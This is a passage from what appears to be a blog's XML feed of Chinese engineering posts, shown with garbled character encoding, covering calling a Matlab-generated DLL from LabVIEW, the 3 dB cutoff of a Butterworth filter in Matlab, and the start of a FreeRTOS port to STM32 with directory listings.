<li>é€‰æ‹© Debug æ¨¡å¼ä¸º x86 æ—¶ç”Ÿæˆ 32 ä½ dll æ–‡ä»¶ï¼Œæ–‡ä»¶å­˜äº .\Debug\Create.dll</li>
</ol>
<p>å¯¹äºä¸åŒä½æ•°çš„ LabVIEW ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©å¯¹åº”çš„ Debug æ¨¡å¼ï¼Œè¿™ä¸ªåŠŸèƒ½çœŸçš„æ˜¯éå¸¸æ£’ï¼</p>
<p><img src="/assets/matlab/CreateDll4.png" alt="Bulid .dll file"></p>
<h3 id="å‡½æ•°æ¥å£"><a href="#å‡½æ•°æ¥å£" class="headerlink" title="å‡½æ•°æ¥å£"></a>å‡½æ•°æ¥å£</h3><p>ç» VS ç”Ÿæˆçš„ API å‡½æ•°æ¥å£è¯´æ˜å¦‚ä¸‹ï¼š</p>
<p>add</p>
<pre><code class="C++">double add(double a, double b);
</code></pre>
<p>getFreq</p>
<pre><code class="C++">double getFreq(const double b_signal[1000], double fs);
</code></pre>
<p>å› ä¸ºä¾‹ç¨‹æ‰€ç”¨æ•°æ®ä¸ºå®šé•¿æ•°ç»„ï¼ˆ1Ã—1000ï¼‰ï¼Œæ‰€ä»¥è¾“å…¥å‚æ•°çš„æ•°æ®ç±»å‹ä¸ºåŸºæœ¬çš„ double å‹ã€‚å€˜è‹¥å®šä¹‰çš„ b_signal ä¸ºä¸å®šé•¿æ•°ç»„ ï¼ˆ1Ã—:infï¼‰ ,å…¶æ ¼å¼å°†å˜ä¸ºï¼š</p>
<pre><code class="C++">double getFreq(const emxArray_real_T *b_signal, double fs);
</code></pre>
<p>è¿™æ˜¯å› ä¸ºç¨‹åºéœ€è¦ä¸ºä¸ç¡®å®šé•¿åº¦çš„æ•°ç»„åŠ¨æ€åˆ†é…å†…å­˜ï¼Œæ‰€ä»¥æœ‰æ•ˆæ•°æ®ä¸å…¶æè¿°ä¿¡æ¯å°†è¢«å°è£…åˆ°ç»“æ„ä½“ä¸­ï¼Œè¯¥ç»“æ„ä½“ä¸º &quot;<strong>emxArray_real_T</strong>&quot;</p>
<pre><code class="C++">struct emxArray_real_T
{
  double *data;
  int *size;
  int allocatedSize;
  int numDimensions;
  boolean_T canFreeData;
};
</code></pre>
<p>ç»“æ„ä½“ä¸­çš„ &quot;<strong>boolean_T</strong>&quot; å®šä¹‰å¦‚ä¸‹</p>
<pre><code class="C++">typedef unsigned char boolean_T;
</code></pre>
<p>ç”±äºä¸å®šé•¿æ•°æ®ä¼šå¯¼è‡´å¤§é‡å†—ä½™ä»£ç ï¼Œå¹¶ä¸”åœ¨ LabVIEW ä¸­è°ƒç”¨æ—¶éå¸¸éº»çƒ¦ï¼Œé™¤éå¿…é¡»ï¼Œå¦åˆ™ä¸å»ºè®®ä½¿ç”¨ï¼Œæœ¬æ–‡åç»­æ‰€è¿°ä¹Ÿæ˜¯å®šé•¿æ•°ç»„ã€‚</p>
<h2 id="é€šè¿‡-LabVIEW-è°ƒç”¨-dllæ–‡ä»¶"><a href="#é€šè¿‡-LabVIEW-è°ƒç”¨-dllæ–‡ä»¶" class="headerlink" title="é€šè¿‡ LabVIEW è°ƒç”¨ .dllæ–‡ä»¶"></a>é€šè¿‡ LabVIEW è°ƒç”¨ .dllæ–‡ä»¶</h2><p>é€šè¿‡ VSï¼Œæˆ‘ä»¬å·²ç»å¾—åˆ°äº†æƒ³è¦çš„ .dll æ–‡ä»¶ï¼Œé‚£ä¹ˆåœ¨ LabVIEW ä¸­è¯¥å¦‚ä½•è°ƒç”¨å‘¢ï¼Ÿè¿™é‡Œæä¾›ä¸¤ç§æ–¹æ³•ã€‚</p>
<ol>
<li>é€šè¿‡è°ƒç”¨åº“å‡½æ•°èŠ‚ç‚¹ï¼ˆCall Library Function Nodeï¼‰</li>
<li>é€šè¿‡ LabVIEW å¯¼å…¥å·¥å…·ï¼ˆTools-&gt;Import-&gt;Shared Library(.dll)...ï¼‰</li>
</ol>
<p>ä¸¤ç§æ–¹æ³•çš„åŸç†ä¸€è‡´ï¼Œä»¥ç¬¬ä¸€ç§æ–¹æ³•ä¸ºä¾‹è¿›è¡Œè®²è§£ã€‚</p>
<h3 id="Call-Library-Function-Node"><a href="#Call-Library-Function-Node" class="headerlink" title="Call Library Function Node"></a>Call Library Function Node</h3><p>åœ¨ LabVIEW å‡½æ•°é¢æ¿æœç´¢ &quot;Call Library&quot; ï¼Œä¸­æ–‡ç‰ˆå¯ç›´æ¥æœç´¢ <code>dll</code>ã€‚å°†è°ƒç”¨åº“å‡½æ•°èŠ‚ç‚¹æ”¾å…¥ç¨‹åºæ¡†å›¾ä¸­ã€‚</p>
<p>è°ƒç”¨ add å‡½æ•°</p>
<ul>
<li>é€‰æ‹© CreateDll.dll æ–‡ä»¶</li>
</ul>
<p><img src="/assets/matlab/UseDll1.png" alt="select CreateDll.dll"></p>
<ul>
<li>é…ç½® add å‡½æ•°æ¥å£</li>
</ul>
<p><img src="/assets/matlab/UseDll1_1.png" alt="Config add function"></p>
<ul>
<li>å‡½æ•°è°ƒç”¨ç¤ºä¾‹</li>
</ul>
<p><img src="/assets/matlab/UseDll1_2.png" alt="Use add function"></p>
<p>è°ƒç”¨ getFreq å‡½æ•°</p>
<ul>
<li>é…ç½® getFreq å‡½æ•°æ¥å£</li>
</ul>
<p><img src="/assets/matlab/UseDll2.png" alt="Config getFreq function"></p>
<ul>
<li>å‡½æ•°è°ƒç”¨ç¤ºä¾‹</li>
</ul>
<p><img src="/assets/matlab/UseDll2_2.png" alt="getFreq front panel"></p>
<p>å…ˆäº§ç”Ÿä¸€ä¸ªæ•°æ®é•¿åº¦ä¸º 1000 ï¼Œé¢‘ç‡å¯è°ƒçš„æ­£å¼¦ä¿¡å·ï¼Œé‡‡æ ·é¢‘ç‡ 1kHzï¼›ç„¶åè°ƒç”¨ .dllæ–‡ä»¶ä¸­çš„ getFreq å‡½æ•°ï¼Œé€šè¿‡è‡ªç›¸å…³æ–¹æ³•æ±‚å–ä¿¡å·é¢‘ç‡ï¼Œå¹¶è¾“å‡ºåˆ°å˜é‡ getFreq ä¸­ã€‚</p>
<p><img src="/assets/matlab/UseDll2_3.png" alt="getFreq block diagram"></p>
<h3 id="ä¸å®šé•¿æ•°ç»„é—®é¢˜"><a href="#ä¸å®šé•¿æ•°ç»„é—®é¢˜" class="headerlink" title="ä¸å®šé•¿æ•°ç»„é—®é¢˜"></a>ä¸å®šé•¿æ•°ç»„é—®é¢˜</h3><p>è¿™é‡Œå¯¹ä¸å®šé•¿æ•°ç»„é—®é¢˜è¿›è¡Œç®€å•ä»‹ç»ï¼š.dll æ–‡ä»¶ä¸­çš„å‡½æ•°å°†ä¸å†æ˜¯ç®€å•çš„ double æŒ‡é’ˆï¼Œè€Œæ˜¯ä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆï¼›åœ¨ LabVIEW ä¸­è°ƒç”¨æ—¶ï¼Œå¯ä»¥åˆ›å»ºè‡ªå®šä¹‰æ§ä»¶ï¼Œç”¨ç°‡ä»£æ›¿è¯¥ç»“æ„ä½“ï¼Œç°‡çš„å¼•ç”¨ä½œä¸ºç»“æ„ä½“æŒ‡é’ˆï¼›ç°‡çš„å†…å®¹åŒ…æ‹¬ä»¥ä¸‹å‡ éƒ¨åˆ†ã€‚</p>
<pre><code class="c">double *pData : ä¸€ç»´æ•°ç»„å¼•ç”¨ï¼Œç”¨äºä¼ é€’ä¿¡å·æ•°æ®
int    *pSize : ä¸€ç»´æ•°ç»„å¼•ç”¨ï¼Œç”¨äºä¼ é€’æ•°æ®é•¿åº¦
int allocatedSize : åˆ†é…å†…å­˜å¤§å°ï¼Œè°ƒç”¨æ—¶å¯è®¾ä¸º 0
int numDimensions : æ•°ç»„ç»´æ•°ï¼Œè®¾ä¸º 1 æˆ– 2
unsigned char canFreeData : å¸ƒå°”å˜é‡ï¼Œç¡®å®šèƒ½å¦é‡Šæ”¾æ•°æ®å†…å­˜
</code></pre>
<p><img src="/assets/matlab/UseDll2_1.png" alt="Create customsize control"></p>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡å¯¹ &quot;Matlab Coder ç”Ÿæˆ C++ ä»£ç &quot;ï¼Œ&quot;VS ç”Ÿæˆ .dll æ–‡ä»¶&quot;ï¼Œ&quot;LabVIEW è°ƒç”¨å¤–éƒ¨åº“å‡½æ•°&quot; è¿™ä¸‰éƒ¨åˆ†å†…å®¹è¿›è¡Œè®²è¿°ã€‚é€šè¿‡Matlab , VS , LabVIEW çš„ç»“åˆä½¿ç”¨ï¼Œæˆ‘ä»¬ä¾¿å¯å®ç° LabVIEW ç¨‹åºè°ƒç”¨ Matlab å‡½æ•°çš„ç›®çš„ã€‚</p>
<p>æ­¤å¤–ï¼Œåœ¨ 64 ä½çš„ VS ä¸­å¯ä»¥é€šè¿‡ä¿®æ”¹ Debug æ¨¡å¼ç”Ÿæˆ 32 ä½æˆ– 64 ä½çš„åŠ¨æ€é“¾æ¥åº“ï¼Œä»¥é€‚é…ä¸åŒç‰ˆæœ¬çš„ LabVIEWã€‚å½“ç„¶æœ€åä¸è¦å¿˜äº†ï¼Œä¸åŒç¼–è¯‘æ¨¡å¼ä¸‹ç”Ÿæˆçš„ .dll æ–‡ä»¶å­˜æ”¾åœ¨ä¸åŒçš„ç›®å½•ä¸‹ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Matlab </category>
            
        </categories>
        
        
        <tags>
            
            <tag> matlab </tag>
            
            <tag> labview </tag>
            
            <tag> VS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Matlab - è®¾è®¡æ»¤æ³¢å™¨æˆªæ­¢é¢‘ç‡]]></title>
      <url>https://www.litreily.top/2016/11/14/signal-Process/</url>
      <content type="html"><![CDATA[<h2 id="æˆªæ­¢é¢‘ç‡"><a href="#æˆªæ­¢é¢‘ç‡" class="headerlink" title="æˆªæ­¢é¢‘ç‡"></a>æˆªæ­¢é¢‘ç‡</h2><p>é€šå¸¸ï¼Œæˆ‘ä»¬å°†ä¿¡å·å¹…å€¼è¡°å‡3dBå¤„çš„é¢‘ç‡ä½œä¸ºæˆªæ­¢é¢‘ç‡ï¼Œè¿™æ˜¯ä¸ºä½•ï¼Ÿ</p>
<p>é¦–å…ˆï¼Œæ˜ç¡®ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p>
<ol>
<li>å¹…å€¼çš„å¹³æ–¹ä¸ºåŠŸç‡</li>
<li>ä¿¡å·åŠŸç‡è¡°å‡ä¸€åŠæ—¶çš„é¢‘ç‡è¢«ç§°ä¸º<strong>æˆªæ­¢é¢‘ç‡</strong></li>
</ol>
<p>å½“ä¿¡å·åŠŸç‡è¡°å‡ä¸€åŠ (1/2) æ—¶ï¼Œå¹…å€¼è¡°å‡ sqrt(1/2) ï¼Œé‚£ä¹ˆå…¶å¯¹åº”çš„ dB å€¼ä¸ºï¼š</p>
<pre><code class="bash">20*log10(sqrt(2)/2) â‰ˆ -3dB
</code></pre>
<h2 id="ä¸¾ä¾‹è¯´æ˜"><a href="#ä¸¾ä¾‹è¯´æ˜" class="headerlink" title="ä¸¾ä¾‹è¯´æ˜"></a>ä¸¾ä¾‹è¯´æ˜</h2><h3 id="æ»¤æ³¢å™¨è®¾è®¡"><a href="#æ»¤æ³¢å™¨è®¾è®¡" class="headerlink" title="æ»¤æ³¢å™¨è®¾è®¡"></a>æ»¤æ³¢å™¨è®¾è®¡</h3><p>è®¾è®¡ä¸€ä¸ª butterworth ä½é€šæ»¤æ³¢å™¨ï¼Œé‡‡æ ·é¢‘ç‡ 100Hz ï¼Œæˆªæ­¢é¢‘ç‡ 20Hz ï¼Œé˜¶æ¬¡ä¸º 4 ã€‚</p>
<pre><code class="matlab">clc
fs = 100;           % é‡‡æ ·é¢‘ç‡
tLen = 2;           % æ—¶é—´é•¿åº¦
pointNum = fs*2;    % é‡‡æ ·ç‚¹æ•°
fpass = 20;         % é€šå¸¦é¢‘ç‡

wp = fpass/(fs/2);      % è®¡ç®—å½’ä¸€åŒ–è§’é¢‘ç‡
[b,a] = butter(4,wp);   % è®¾è®¡æ»¤æ³¢å™¨

% è·å–é¢‘ç‡ç‰¹æ€§
[H,F] = freqz(b,a,pointNum,fs);
H = 20*log10(abs(H));

hold off
plot(F,H);grid on;hold on

fcAmp = H(fpass*2*pointNum/fs+1);
stem(fpass,fcAmp,&#39;linewidth&#39;,2);
text(fpass+2,fcAmp-1,num2str(fcAmp));

setPlot(&#39;æ»¤æ³¢å™¨å¹…é¢‘ç‰¹æ€§&#39;,&#39;frequency(Hz)&#39;,&#39;amptitude(dB)&#39;,[F(1) F(end)],[-50,10]);
</code></pre>
<h3 id="setPlot"><a href="#setPlot" class="headerlink" title="setPlot"></a>setPlot</h3><p>ç¨‹åºä¸­ç”¨åˆ°çš„ setPlot å‡½æ•°ç”¨äºè®¾ç½®å›¾å½¢çš„ title , xlabel , ylabel , xlim , ylim.</p>
<pre><code class="matlab">function [  ] = setPlot( varargin )
% setPlot()
% setPlot(title)
% setPlot(title,xlabel)
% setPlot(title,xlable,ylabel)
% setPlot(title,xlabel,ylabel,xlim)
% setPlot(title,xlable,ylabel,xlim,ylim)

narginchk(0,5);     % åˆ¤æ–­è¾“å…¥å‚æ•°æ˜¯å¦è¶³å¤Ÿ

grid on;
axis tight;

if nargin&gt;=1
    title(varargin{1});
end

if nargin&gt;=2
    xlabel(varargin{2});
end

if nargin&gt;=3
    ylabel(varargin{3});
end

if nargin&gt;=4
    xlim(varargin{4});
end

if nargin&gt;=5
    ylim(varargin{5});
end

end
</code></pre>
<h3 id="æ»¤æ³¢å™¨å¹…é¢‘ç‰¹æ€§"><a href="#æ»¤æ³¢å™¨å¹…é¢‘ç‰¹æ€§" class="headerlink" title="æ»¤æ³¢å™¨å¹…é¢‘ç‰¹æ€§"></a>æ»¤æ³¢å™¨å¹…é¢‘ç‰¹æ€§</h3><p><img src="/assets/matlab/fc20Hz.png" alt="æˆªæ­¢é¢‘ç‡"></p>
<p>ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼ŒæŒ‰ç…§è¦æ±‚è®¾è®¡å¾—åˆ°çš„æ»¤æ³¢å™¨ï¼Œæˆªæ­¢é¢‘ç‡ 20Hz å¯¹åº”çš„å¹…å€¼è¡°å‡ä¸º -3.0103dB ,çº¦ä¸º -3dB ï¼Œä¸ç†è®ºæ‰€è¿°ç›¸å»åˆã€‚</p>
]]></content>
      
        <categories>
            
            <category> Matlab </category>
            
        </categories>
        
        
        <tags>
            
            <tag> matlab </tag>
            
            <tag> signal </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[stm32 - FreeRTOSç³»ç»Ÿç§»æ¤]]></title>
      <url>https://www.litreily.top/2016/11/02/FreeRTOS/</url>
      <content type="html"><![CDATA[<p>å‰æ®µæ—¶é—´ç ”ç©¶äº†ä¸€ä¸‹ FreeRTOS åœ¨ stm32 çš„ç³»ç»Ÿç§»æ¤ï¼Œè§‰å¾—æœ‰å¿…è¦åšä¸ªæ€»ç»“ï¼Œè®°å½•è¿™ç ”å‘è·¯ä¸Šçš„ç‚¹ç‚¹æ»´æ»´ã€‚</p>
<h2 id="FreeRTOS"><a href="#FreeRTOS" class="headerlink" title="FreeRTOS"></a>FreeRTOS</h2><p>ä» <a href="http://www.freertos.org/" target="_blank" rel="noopener">FreeRTOSå®˜ç½‘</a> ä¸‹è½½æœ€æ–°æºç ï¼Œæˆ‘ä¸‹è½½çš„æ˜¯ <a href="http://pan.baidu.com/s/1jIbOqDg" target="_blank" rel="noopener">FreeRTOSv9.0.0</a> ï¼Œå…¶æ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼Œæ ¹ç›®å½•ä¸»è¦åŒ…å« FreeRTOS å’Œ FreeRTOS-Plus ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œ Plus ç‰ˆç³»ç»Ÿæ·»åŠ äº† TCP/UDP ç­‰ç½‘ç»œé€šä¿¡åŠŸèƒ½ã€‚</p>
<pre><code class="txt">D:\FREERTOSV9.0.0
â”‚  New - Direct to Task Notifications.html
â”‚  New - FreeRTOS+TCP.html
â”‚  Quick_Start_Guide.html
â”‚  Upgrading-to-FreeRTOS-9.html
â”‚  readme.txt
â”‚
â”œâ”€FreeRTOS
â”‚   â”‚  links_to_doc_pages_for_the_demo_projects.html
â”‚   â”‚  readme.txt
â”‚   â”‚
â”‚   â”œâ”€Demo
â”‚   â”œâ”€License
â”‚   â””â”€Source
â”‚
â””â”€FreeRTOS-Plus
    â”‚  readme.txt
    â”‚
    â”œâ”€Demo
    â””â”€Source
</code></pre>
<p>æš‚ä¸”ä¸è€ƒè™‘plusç‰ˆï¼Œæ‰“å¼€FreeRTOSæ–‡ä»¶å¤¹ï¼Œå…¶ä¸­åŒ…å«3ä¸ªæ–‡ä»¶å¤¹ï¼š</p>
<ol>
<li>Demoï¼šä¸åŒå¤„ç†å™¨çš„FreeRTOSç³»ç»Ÿç§»æ¤ä¾‹ç¨‹</li>
<li>Licenseï¼šè®¸å¯è¯ï¼Œå¯¹FreeRTOSä½¿ç”¨èŒƒå›´è¿›è¡Œæˆæƒ</li>
<li>Sourceï¼šFreeRTOSæºç </li>
</ol>
<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>Demo åŒ…å«äº†å®˜æ–¹æä¾›çš„æ‰€æœ‰å·²é€‚é…å¤„ç†å™¨çš„ç§»æ¤ä¾‹ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®è‡ªå·±æ‰€ç”¨èŠ¯ç‰‡å’Œå¼€å‘ç¯å¢ƒé€‰æ‹©åˆé€‚çš„ä¾‹ç¨‹è¿›è¡Œå­¦ä¹ ã€‚</p>
<pre><code class="txt">ARM7_AT91FR40008_GCC
ARM7_AT91SAM7S64_IAR
ARM7_AT91SAM7X256_Eclipse
ARM7_LPC2106_GCC
ARM7_LPC2129_IAR
ARM7_LPC2129_Keil_RVDS
ARM7_LPC2138_Rowley
ARM7_LPC2368_Eclipse
ARM7_LPC2368_Rowley
ARM7_STR71x_IAR
ARM7_STR75x_GCC
ARM7_STR75x_IAR
ARM9_AT91SAM9XE_IAR
ARM9_STR91X_IAR
AVR32_UC3
AVR_ATMega323_IAR
AVR_ATMega323_WinAVR
ColdFire_MCF51CN128_CodeWarrior
ColdFire_MCF52221_CodeWarrior
ColdFire_MCF52233_Eclipse
ColdFire_MCF52259_CodeWarrior
ColdFire_MCF5282_Eclipse
Common
CORTEX_A2F200_IAR_and_Keil
CORTEX_A2F200_SoftConsole
CORTEX_A53_64-bit_UltraScale_MPSoC
CORTEX_A5_SAMA5D2x_Xplained_IAR
CORTEX_A5_SAMA5D3x_Xplained_IAR
CORTEX_A5_SAMA5D4x_EK_IAR
CORTEX_A9_Cyclone_V_SoC_DK
CORTEX_A9_RZ_R7S72100_IAR_DS-5
CORTEX_A9_Zynq_ZC702
CORTEX_AT91SAM3U256_IAR
CORTEX_ATSAM3S-EK2_Atmel_Studio
CORTEX_ATSAM3X_Atmel_Studio
CORTEX_CY8C5588_PSoC_Creator_GCC
CORTEX_CY8C5588_PSoC_Creator_Keil
CORTEX_CY8C5588_PSoC_Creator_RVDS
CORTEX_EFM32_Giant_Gecko_Simplicity_Studio
CORTEX_EFM32_Pearl_Gecko_Simplicity_Studio
CORTEX_EFMG890F128_IAR
CORTEX_Kinetis_K60_Tower_IAR
CORTEX_LM3S102_GCC
CORTEX_LM3S102_Rowley
CORTEX_LM3S316_IAR
CORTEX_LM3S811_GCC
CORTEX_LM3S811_IAR
CORTEX_LM3S811_KEIL
CORTEX_LM3Sxxxx_Eclipse
CORTEX_LM3Sxxxx_IAR_Keil
CORTEX_LM3Sxxxx_Rowley
CORTEX_LPC1768_GCC_RedSuite
CORTEX_LPC1768_GCC_Rowley
CORTEX_LPC1768_IAR
CORTEX_M0+_Atmel_SAMD20_XPlained
CORTEX_M0_Infineon_XMC1000_IAR_Keil_GCC
CORTEX_M0_LPC1114_LPCXpresso
CORTEX_M0_STM32F0518_IAR
CORTEX_M4F_ATSAM4E_Atmel_Studio
CORTEX_M4F_CEC1302_Keil_GCC
CORTEX_M4F_CEC1302_MikroC
CORTEX_M4F_Infineon_XMC4000_GCC_Dave
CORTEX_M4F_Infineon_XMC4000_IAR
CORTEX_M4F_Infineon_XMC4000_Keil
CORTEX_M4F_Infineon_XMC4000_Tasking
CORTEX_M4F_Infineon_XMC4500_GCC_Atollic
CORTEX_M4F_M0_LPC43xx_Keil
CORTEX_M4F_MSP432_LaunchPad_IAR_CCS_Keil
CORTEX_M4F_STM32F407ZG-SK
CORTEX_M4_ATSAM4L_Atmel_Studio
CORTEX_M4_ATSAM4S_Atmel_Studio
CORTEX_M7_SAME70_Xplained_AtmelStudio
CORTEX_M7_SAMV71_Xplained_AtmelStudio
CORTEX_M7_SAMV71_Xplained_IAR_Keil
CORTEX_M7_STM32F7_STM32756G-EVAL_IAR_Keil
CORTEX_MB9A310_IAR_Keil
CORTEX_MB9B500_IAR_Keil
CORTEX_MPU_LM3Sxxxx_Rowley
CORTEX_MPU_LPC1768_GCC_RedSuite
CORTEX_MPU_Simulator_Keil_GCC
CORTEX_R4F_RZ_T_GCC_IAR
CORTEX_R4_RM48_TMS570_CCS5
CORTEX_R5_UltraScale_MPSoC
CORTEX_SmartFusion2_M2S050_SoftConsole
CORTEX_STM32F100_Atollic
CORTEX_STM32F103_GCC_Rowley
CORTEX_STM32F103_IAR
CORTEX_STM32F103_Keil
CORTEX_STM32F103_Primer_GCC
CORTEX_STM32F107_GCC_Rowley
CORTEX_STM32L152_Discovery_IAR
CORTEX_STM32L152_IAR
CORTUS_APS3_GCC
Cygnal
dsPIC_MPLAB
Flshlite
H8S
HCS12_CodeWarrior_banked
HCS12_CodeWarrior_small
HCS12_GCC_banked
IA32_flat_GCC_Galileo_Gen_2
lwIP_AVR32_UC3
lwIP_Demo_Rowley_ARM7
lwIP_MCF5235_GCC
MB91460_Softune
MB96340_Softune
MB96350_Softune_Dice_Kit
MCF5235_GCC
MicroBlaze_Kintex7_EthernetLite
MicroBlaze_Spartan-6_EthernetLite
MSP430X_MSP430F5438_CCS
MSP430X_MSP430F5438_IAR
MSP430X_MSP430FR5969_LaunchPad_IAR_CCS
msp430_CrossWorks
msp430_GCC
msp430_IAR
NEC_78K0R_IAR
NEC_V850ES_IAR
NiosII_CycloneIII_DBC3C40_GCC
PC
PIC18_MPLAB
PIC18_WizC
PIC24_MPLAB
PIC32MEC14xx_MPLAB
PIC32MX_MPLAB
PIC32MZ_MPLAB
PPC405_FPU_Xilinx_Virtex4_GCC
PPC405_Xilinx_Virtex4_GCC
PPC440_DP_FPU_Xilinx_Virtex5_GCC
PPC440_SP_FPU_Xilinx_Virtex5_GCC
PPC440_Xilinx_Virtex5_GCC
RL78_multiple_IAR
RL78_RL78G13_Promo_Board_IAR
RX100-RSK_GCC_e2studio
RX100-RSK_IAR
RX100-RSK_Renesas_e2studio
RX100_RX113-RSK_GCC_e2studio_IAR
RX100_RX113-RSK_Renesas_e2studio
RX200_RX210-RSK_Renesas
RX200_RX231-RSK_GCC_e2studio_IAR
RX200_RX231-RSK_Renesas_e2studio
RX600_RX62N-RDK_GNURX
RX600_RX62N-RDK_IAR
RX600_RX62N-RDK_Renesas
RX600_RX62N-RSK_GNURX
RX600_RX62N-RSK_IAR
RX600_RX62N-RSK_Renesas
RX600_RX630-RSK_Renesas
RX600_RX63N-RDK_Renesas
RX600_RX64M_RSK_GCC_e2studio
RX600_RX64M_RSK_Renesas_e2studio
RX700_RX71M_RSK_GCC_e2studio_IAR
RX700_RX71M_RSK_Renesas_e2studio
SuperH_SH7216_Renesas
TriCore_TC1782_TriBoard_GCC
uIP_Demo_IAR_ARM7
uIP_Demo_Rowley_ARM7
Unsupported_Demos
WIN32-MingW
WIN32-MSVC
WIN32-MSVC-Static-Allocation-Only
WizNET_DEMO_GCC_ARM7
WizNET_DEMO_TERN_186
Xilinx_FreeRTOS_BSP

</code></pre>
<h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p>Source æ˜¯ FreeRTOS çš„æ ¸å¿ƒï¼ŒåŒ…å«äº†ç³»ç»Ÿå†…æ ¸åŠå„ç±»å¤„ç†å™¨ç³»ç»Ÿç§»æ¤æ‰€éœ€çš„æºç ã€‚</p>
<pre><code class="txt">
D:\FREERTOSV9.0.0\FREERTOS\SOURCE
â”‚  croutine.c
â”‚  event_groups.c
â”‚  list.c
â”‚  queue.c
â”‚  readme.txt
â”‚  tasks.c
â”‚  timers.c
â”‚
â”œâ”€include
â”‚      croutine.h
â”‚      deprecated_definitions.h
â”‚      event_groups.h
â”‚      FreeRTOS.h
â”‚      list.h
â”‚      mpu_prototypes.h
â”‚      mpu_wrappers.h
â”‚      portable.h
â”‚      projdefs.h
â”‚      queue.h
â”‚      semphr.h
â”‚      StackMacros.h
â”‚      stdint.readme
â”‚      task.h
â”‚      timers.h
â”‚
â””â”€portable
    â”‚  readme.txt
    â”‚
    â”œâ”€BCC
    â”‚  â””â”€16BitDOS
    â”‚      â”œâ”€common
    â”‚      â”‚      portasm.h
    â”‚      â”‚      portcomn.c
    â”‚      â”‚
    â”‚      â”œâ”€Flsh186
    â”‚      â”‚      port.c
    â”‚      â”‚      prtmacro.h
    â”‚      â”‚
    â”‚      â””â”€PC
    â”‚              port.c
    â”‚              prtmacro.h
    â”‚
    â”œâ”€CCS
    â”‚  â”œâ”€ARM_CM4F
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.asm
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_Cortex-R4
    â”‚  â”‚      port.c
    â”‚  â”‚      portASM.asm
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â””â”€MSP430X
    â”‚          data_model.h
    â”‚          port.c
    â”‚          portext.asm
    â”‚          portmacro.h
    â”‚
    â”œâ”€CodeWarrior
    â”‚  â”œâ”€ColdFire_V1
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.S
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ColdFire_V2
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.S
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â””â”€HCS12
    â”‚          port.c
    â”‚          portmacro.h
    â”‚
    â”œâ”€Common
    â”‚      mpu_wrappers.c
    â”‚
    â”œâ”€GCC
    â”‚  â”œâ”€ARM7_AT91FR40008
    â”‚  â”‚      port.c
    â”‚  â”‚      portISR.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM7_AT91SAM7S
    â”‚  â”‚      AT91SAM7X256.h
    â”‚  â”‚      ioat91sam7x256.h
    â”‚  â”‚      lib_AT91SAM7X256.c
    â”‚  â”‚      lib_AT91SAM7X256.h
    â”‚  â”‚      port.c
    â”‚  â”‚      portISR.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM7_LPC2000
    â”‚  â”‚      port.c
    â”‚  â”‚      portISR.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM7_LPC23xx
    â”‚  â”‚      port.c
    â”‚  â”‚      portISR.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CA53_64_BIT
    â”‚  â”‚      port.c
    â”‚  â”‚      portASM.S
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CA9
    â”‚  â”‚      port.c
    â”‚  â”‚      portASM.S
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CM0
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CM3
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CM3_MPU
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CM4F
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CM4_MPU
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CM7
    â”‚  â”‚  â”‚  ReadMe.txt
    â”‚  â”‚  â”‚
    â”‚  â”‚  â””â”€r0p1
    â”‚  â”‚          port.c
    â”‚  â”‚          portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CR5
    â”‚  â”‚      port.c
    â”‚  â”‚      portASM.S
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ARM_CRx_No_GIC
    â”‚  â”‚      port.c
    â”‚  â”‚      portASM.S
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ATMega323
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€AVR32_UC3
    â”‚  â”‚      exception.S
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€ColdFire_V2
    â”‚  â”‚      port.c
    â”‚  â”‚      portasm.S
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€CORTUS_APS3
    â”‚  â”‚      port.c
    â”‚  â”‚      portmacro.h
    â”‚  â”‚
    â”‚  â”œâ”€H8S2329
